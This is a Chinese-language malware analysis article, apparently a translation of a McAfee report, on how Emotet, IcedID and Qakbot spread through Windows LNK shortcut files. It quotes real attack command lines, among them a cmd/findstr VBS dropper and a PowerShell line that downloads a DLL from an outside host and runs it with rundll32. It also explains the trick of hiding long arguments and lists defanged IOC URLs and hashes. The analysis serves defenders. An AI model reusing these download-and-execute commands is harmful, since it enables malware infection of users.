LNK 文件是 Windows 平台下的快捷方式，是打开文件、文件夹或者应用程序的“指针”。LNK 文件为 Shell Link
二进制文件格式，其中包含用于访问另一个数据对象的信息。

LNK 文件可以使用标准方式通过右键单击手动创建，也可以使用应用程序自动创建。许多工具都可以构建 LNK 文件，甚至包括恶意目的的工具
`lnkbombs`。

2022 年第二季度，McAfee 发现 LNK 类恶意软件有所增长。攻击者通过 LNK 文件的易用性，传播
Emotet、Qakbot、IcedID、Bazarloaders 等恶意软件。

![image.png-225kB](https://image.3001.net/images/20220708/1657283647_62c8243fd5ad1aa2a6a86.png!small)LNK
恶意软件全球分布

LNK 快捷方式在普通用户眼里如下所示：

![image.png-362.4kB](https://image.3001.net/images/20220708/1657283648_62c82440caf407bb2e611.png!small)LNK
视图

## 威胁与攻击活动

随着微软默认禁用 Office 宏，攻击者正在增强攻击手段，包括利用 LNK 文件实现攻击意图。

攻击者通过垃圾邮件或者恶意 URL 将 LNK 文件投递给受害者，这些文件通常会操纵 PowerShell、CMD 和 MSHTA
等合法应用程序下载恶意文件。

## Emotet

### 感染链

![image.png-314.4kB](https://image.3001.net/images/20220708/1657283649_62c82441e98d2f48a601d.png!small)感染链

### 威胁分析

![image.png-656.8kB](https://image.3001.net/images/20220708/1657283650_62c82442cf08382005d23.png!small)携带
LNK 的电子邮件

上图中，可以看到诱饵消息与 LNK 附件文件。用户点击 LNK 文件，即可触发感染。该 LNK 文件的属性如下所示：

![image.png-476.1kB](https://image.3001.net/images/20220708/1657283651_62c82443cd8744b65480e.png!small)LNK
文件属性

如上所示，LNK 调用 cmd.exe 执行命令。在属性页中最多可见 255 个字符，但实际命令行执行的参数最长可达 4096
个字符。攻击者利用这一差异，使长参数在属性中不可见。

本例中的参数为 `/v:on /c findstr “glKmfOKnQLYKnNs.*” “Form 04.25.2022, US.lnk” >
“%tmp%\YlScZcZKeP.vbs” & “%tmp%\YlScZcZKeP.vbs”`。

![image.png-333.5kB](https://image.3001.net/images/20220708/1657283652_62c82444e7bf1fb2bed0e.png!small)LNK
文件内容

一旦 findstr.exe 接收到字符串，LNK 文件的其余内容将保存在 %temp% 文件夹下的 .VBS 文件中，随机文件名称为
`YIScZcZKeP.vbs`。

cmd.exe 紧接着调用 wscript.exe 加载 VBS 文件下载 Emotet 的 64 位 DLL 文件。

下载的 DLL 文件通过 REGSVR32.EXE 进行执行，这与 Excel 的 Emotet 样本相类似。

## ICEDID

### 感染链

![image.png-97.5kB](https://image.3001.net/images/20220708/1657283653_62c82445c3eb4bab46085.png!small)ICEDID
感染链

### 威胁分析

LNK 文件通过 Powershell 执行高度混淆的参数，如下所示：

![image.png-226.3kB](https://image.3001.net/images/20220708/1657283654_62c82446944feac055927.png!small)ICEDID
样本属性

参数非常长，在属性中不完全可见。运行时会将混淆参数解密，然后通过 `hxxps://hectorcalle[.]com/093789.hta`执行
MSHTA。

下载的 HTA 文件调用另一个具有类似混淆参数的 PowerShell，再拉取
`hxxps://hectorcalle[.]com/listbul.exe`。

## QAKBOT

### 感染链

![image.png-59.4kB](https://image.3001.net/images/20220708/1657283655_62c82447572ca41437c9c.png!small)QAKBOT
感染链

## 威胁分析

![image.png-229kB](https://image.3001.net/images/20220708/1657283656_62c82448129769f24659b.png!small)QAKBOT
样本属性

完整的参数为 `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr
-Uri hxxps://news-wellness.com/5MVhfo8BnDub/D.png -OutFile
$env:TEMP\test.dll;Start-Process rundll32.exe $env:TEMP\test.dll,jhbvygftr`。

PowerShell 会利用 Invoke-WebRequest 命令下载`hxxps://news-wellness.com/5MVhfo8BnDub/D.png`保存到 %temp% 文件夹下。DLL 文件即为 Qakbot，然后使用 rundll32
执行。

## 结论

在最近活跃的攻击行动中，攻击者滥用 Windows 快捷方式 LNK 文件发起攻击。LNK 也会与 PowerShell、CMD、MSHTA
等文件结合使用，实现完整攻击。

## IOC

> 02eccb041972825d51b71e88450b094cf692b9f5f46f5101ab3f2210e2e1fe71  
> 24ee20d7f254e1e327ecd755848b8b72cd5e6273cf434c3a520f780d5a098ac9  
> b5d5464d4c2b231b11b594ce8500796f8946f1b3a10741593c7b872754c2b172  
> hxxps://creemo[.]pl/wp-admin/ZKS1DcdquUT4Bb8Kb/  
> hxxp://filmmogzivota[.]rs/SpryAssets/gDR/  
> hxxp://demo34.ckg[.]hk/service/hhMZrfC7Mnm-9JD/  
> hxxp://focusmedica[.]in/fmlib/IxBABMh0I2cLM3qq1GVv/  
> hxxp://cipro[.]mx/prensa/siZP69rBFmibDvuTP1/  
> hxxps://hectorcalle[.]com/093789.hta  
> hxxps://hectorcalle[.]com/listbul.exe  
> hxxps://green-a-thon[.]com/LosZkUvr/B.png

## 参考来源

> [McAfee](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-> shortcut-files-malware/)

